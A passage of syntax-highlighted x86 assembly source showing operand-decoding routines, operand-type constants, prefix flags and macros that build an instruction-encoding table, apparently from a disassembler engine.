</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">t4argsizeof</span><span class="sc0">             </span><span class="sc1">; then modify the b4 arg</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">Imm</span><span class="sc0">                 </span><span class="sc1">; and watch how to mod it.</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">MemWImm</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">notMemRegW8</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">Imm8</span><span class="sc0">

</span><span class="sc5">notMemRegW8</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">; then get the edx</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Gotimm</span><span class="sc0">                  </span><span class="sc1">; get the imediate</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">              

</span><span class="sc5">notMemWtype1</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">notMemWtype</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RegWIm8</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">notMemWtype1</span><span class="sc0">                </span><span class="sc1">; watch if have a RegW/MemW</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">RegWord</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getoperand</span><span class="sc0">              </span><span class="sc1">; load the reg</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">t4argtype</span><span class="sc4">],</span><span class="sc2">18</span><span class="sc0">     </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">t4argvalue</span><span class="sc4">],-</span><span class="sc2">2</span><span class="sc0">        </span><span class="sc1">; then set the type</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">RegWCl</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">notMemWtype1</span><span class="sc0">                </span><span class="sc1">; skip loading the value</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">loadit</span><span class="sc0">


</span><span class="sc1">; tadam ------------------------------------</span><span class="sc0">

</span><span class="sc5">getsize</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">skipMembit</span><span class="sc0">              </span><span class="sc1">; well, we don't word analyse</span><span class="sc0">

</span><span class="sc6">bt</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4prefix</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">      </span><span class="sc1">; check if we have a dword</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">makeit2</span><span class="sc0">

</span><span class="sc5">makeit4</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                   </span><span class="sc1">; extended word</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">skipMembit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">skip8bit</span><span class="sc0">                </span><span class="sc1">; skip the 8 bit</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4word</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; check if we have a </span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">skip8bit</span><span class="sc0">    

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; set 8 bit</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">skip8bit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">bt</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4prefix</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">makeit4</span><span class="sc0">                 </span><span class="sc1">; check if prefix is 16 bit</span><span class="sc0">
                        </span><span class="sc1">; all normal, then set dword</span><span class="sc0">
</span><span class="sc5">makeit2</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                   </span><span class="sc1">; return a word</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">NULL</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">d1</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc0">

</span><span class="sc5">Acc</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">AccWord</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">

</span><span class="sc5">Reg</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">Reg8</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">Reg16</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
</span><span class="sc5">Reg32</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">

</span><span class="sc5">RegWord</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">

</span><span class="sc5">Imm</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
</span><span class="sc5">Imm8</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">Imm16</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0">
</span><span class="sc5">Imm32</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">

</span><span class="sc5">Mem</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">13</span><span class="sc0">
</span><span class="sc5">Mem8</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">14</span><span class="sc0">
</span><span class="sc5">Mem16</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">15</span><span class="sc0">
</span><span class="sc5">Mem32</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">16</span><span class="sc0">

</span><span class="sc5">MemWord</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">17</span><span class="sc0">          </span><span class="sc1">; O think so :)</span><span class="sc0">

</span><span class="sc5">MemOffs</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc0">

</span><span class="sc5">Far0</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">19</span><span class="sc0">
</span><span class="sc5">Short0</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">
</span><span class="sc5">Near0</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">

</span><span class="sc5">MemFar</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">22</span><span class="sc0">

</span><span class="sc5">DX0</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">24</span><span class="sc0">
</span><span class="sc5">CL0</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">25</span><span class="sc0">

</span><span class="sc5">DRn</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">26</span><span class="sc0">
</span><span class="sc5">TRn</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">27</span><span class="sc0">
</span><span class="sc5">CRn</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">28</span><span class="sc0">

</span><span class="sc5">Seg0</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">29</span><span class="sc0">
</span><span class="sc5">SegOld</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">30</span><span class="sc0">

</span><span class="sc5">Mem64</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">31</span><span class="sc0">

</span><span class="sc5">MemWImm</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0">
</span><span class="sc5">MemWIm8</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">33</span><span class="sc0">

</span><span class="sc5">RegWCl</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">34</span><span class="sc0">
</span><span class="sc5">RegWIm8</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">35</span><span class="sc0">

</span><span class="sc5">ImmNEAR</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">Imm16</span><span class="sc0">
</span><span class="sc5">ImmFAR</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">Imm16</span><span class="sc0">

</span><span class="sc5">pRVb</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000001b</span><span class="sc0">       </span><span class="sc1">; -S</span><span class="sc0">
</span><span class="sc5">pRV</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000010b</span><span class="sc0">       </span><span class="sc1">;  T-</span><span class="sc0">
</span><span class="sc5">pCS</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000100b</span><span class="sc0">       </span><span class="sc1">; -A</span><span class="sc0">
</span><span class="sc5">pDS</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00001000b</span><span class="sc0">       </span><span class="sc1">;  R-</span><span class="sc0">
</span><span class="sc5">pES</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00010000b</span><span class="sc0">       </span><span class="sc1">; -Z</span><span class="sc0">
</span><span class="sc5">pFS</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00100000b</span><span class="sc0">       </span><span class="sc1">;  E-</span><span class="sc0">
</span><span class="sc5">pGS</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">01000000b</span><span class="sc0">       </span><span class="sc1">; -R</span><span class="sc0">
</span><span class="sc5">pSS</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">10000000b</span><span class="sc0">       </span><span class="sc1">;  0-</span><span class="sc0">

</span><span class="sc5">instruction</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc9">name</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">operand1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">operand2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">binary</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wtype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">otype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">rtype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">mtype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">stype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ctype</span><span class="sc0">

</span><span class="sc5">iip</span><span class="sc4">&amp;</span><span class="sc9">name</span><span class="sc4">&amp;:</span><span class="sc0">
</span><span class="sc5">ii</span><span class="sc4">&amp;</span><span class="sc9">name</span><span class="sc4">&amp;</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">iip</span><span class="sc4">&amp;</span><span class="sc9">name</span><span class="sc4">&amp;</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">iitable</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">+((</span><span class="sc9">size</span><span class="sc4">/</span><span class="sc2">8</span><span class="sc4">)*</span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0">                 </span><span class="sc1">; 0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">operand1</span><span class="sc4">,</span><span class="sc5">operand2</span><span class="sc0">       </span><span class="sc1">; 2-3</span><span class="sc0">

        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc4">&amp;</span><span class="sc5">binary</span><span class="sc4">&amp;</span><span class="sc0">            </span><span class="sc1">; 5</span><span class="sc0">

                </span><span class="sc9">dd</span><span class="sc0">     </span><span class="sc4">(((((</span><span class="sc0"> </span><span class="sc5">ctype</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">stype</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">rtype</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mtype</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">wtype</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">otype</span><span class="sc0">

</span><span class="sc1">;               db      '&amp;name&amp;',-1</span><span class="sc0">

</span><span class="sc5">ii_</span><span class="sc4">&amp;</span><span class="sc9">name</span><span class="sc4">&amp;</span><span class="sc5">_end</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">instructionb</span><span class="sc0">    </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc9">name</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">operand1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">operand2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">binary</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wtype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">otype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">rtype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">mtype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">stype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ctype</span><span class="sc0">

</span><span class="sc5">iip</span><span class="sc4">&amp;</span><span class="sc9">name</span><span class="sc4">&amp;:</span><span class="sc0">
</span><span class="sc5">ii</span><span class="sc4">&amp;</span><span class="sc9">name</span><span class="sc4">&amp;</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">iip</span><span class="sc4">&amp;</span><span class="sc9">name</span><span class="sc4">&amp;</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">iitable</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc4">+((</span><span class="sc9">size</span><span class="sc4">/</span><span class="sc2">8</span><span class="sc4">)*</span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0">                 </span><span class="sc1">; 0</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc4">&amp;</span><span class="sc5">binary</span><span class="sc4">&amp;</span><span class="sc0">            </span><span class="sc1">; 5</span><span class="sc0">
        
</span><span class="sc1">;               db      '&amp;name&amp;',-1</span><span class="sc0">
</span><span class="sc5">ii_</span><span class="sc4">&amp;</span><span class="sc9">name</span><span class="sc4">&amp;</span><span class="sc5">_end</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">variance</span><span class="sc0">    </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">operand1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">operand2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">binary</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wtype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">otype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">rtype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">mtype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">stype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ctype</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">2</span><span class="sc4">+((</span><span class="sc9">size</span><span class="sc4">/</span><span class="sc2">8</span><span class="sc4">)*</span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">operand1</span><span class="sc4">,</span><span class="sc5">operand2</span><span class="sc0">       </span><span class="sc1">; 1</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc4">&amp;</span><span class="sc5">binary</span><span class="sc4">&amp;</span><span class="sc0">            </span><span class="sc1">; 4 + 2 = 6</span><span class="sc0">

                </span><span class="sc9">dd</span><span class="sc0">     </span><span class="sc4">(((((</span><span class="sc0"> </span><span class="sc5">ctype</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">stype</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">rtype</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mtype</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">wtype</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">otype</span><span class="sc0">

</span><span class="sc1">;       db  -1</span><span class="sc0">

        </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">varianceb</span><span class="sc0">       </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">operand1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">operand2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">binary</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wtype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">otype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">rtype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">mtype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">stype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ctype</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">3</span><span class="sc4">+((</span><span class="sc9">size</span><span class="sc4">/</span><span class="sc2">8</span><span class="sc4">)*</span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc4">&amp;</span><span class="sc5">binary</span><span class="sc4">&amp;</span><span class="sc0">            </span><span class="sc1">; 4 + 2 = 6</span><span class="sc0">

</span><span class="sc1">;       db  -1</span><span class="sc0">

        </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">instruction8</span><span class="sc0">    </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc9">name</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">operand1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">operand2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">binary</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wtype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">otype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">rtype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">mtype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">stype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ctype</span><span class="sc0">

</span><span class="sc5">iip</span><span class="sc4">&amp;</span><span class="sc9">name</span><span class="sc4">&amp;:</span><span class="sc0">
</span><span class="sc5">ii</span><span class="sc4">&amp;</span><span class="sc9">name</span><span class="sc4">&amp;</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">iip</span><span class="sc4">&amp;</span><span class="sc9">name</span><span class="sc4">&amp;</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">iitable</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">+((</span><span class="sc9">size</span><span class="sc4">/</span><span class="sc2">8</span><span class="sc4">)*</span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0">                 </span><span class="sc1">; 0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">operand1</span><span class="sc4">,</span><span class="sc5">operand2</span><span class="sc0">       </span><span class="sc1">; 2-3</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">&amp;</span><span class="sc5">binary</span><span class="sc4">&amp;</span><span class="sc0">                        </span><span class="sc1">; 5</span><span class="sc0">

                </span><span class="sc9">dd</span><span class="sc0">     </span><span class="sc4">(((((</span><span class="sc0"> </span><span class="sc5">ctype</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">stype</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">rtype</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mtype</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">wtype</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">otype</span><span class="sc0">

</span><span class="sc1">;               db      '&amp;name&amp;',-1</span><span class="sc0">

</span><span class="sc5">ii_</span><span class="sc4">&amp;</span><span class="sc9">name</span><span class="sc4">&amp;</span><span class="sc5">_end</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">instruction8b</span><span class="sc0">   </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc9">name</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">operand1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">operand2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">binary</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wtype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">otype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">rtype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">mtype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">stype</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ctype</span><span class="sc0">

</span><span class="sc5">iip</span><span class="sc4">&amp;</span><span class="sc9">name</span><span class="sc4">&amp;:</span><span class="sc0">
</span><span class="sc5">ii</span><span class="sc4">&amp;</span><span class="sc9">name</span><span class="sc4">&amp;</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">iip</span><span class="sc4">&amp;</span><span class="sc9">name</span><span class="sc4">&amp;</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">iitable</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc4">+((</span><span class="sc9">size</span><span class="sc4">/</span><span class="sc2">8</span><span class="sc4">)*</span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0">                 </span><span class="sc1">; 0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">&amp;</span><span class="sc5">binary</span><span class="sc4">&amp;</span><span class="sc0">                        </span><span class="sc1">; 5</span><span class="sc0">

</span><span class="sc1">;               db      '&amp;name&amp;',-1</span><span class="sc0">
</span><span class="sc5">ii_</span><span class="sc4">&amp;</span><span class="sc9">name</span><span class="sc4">&amp;</span><span class="sc5">_end</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">endm</span><span class="sc0">


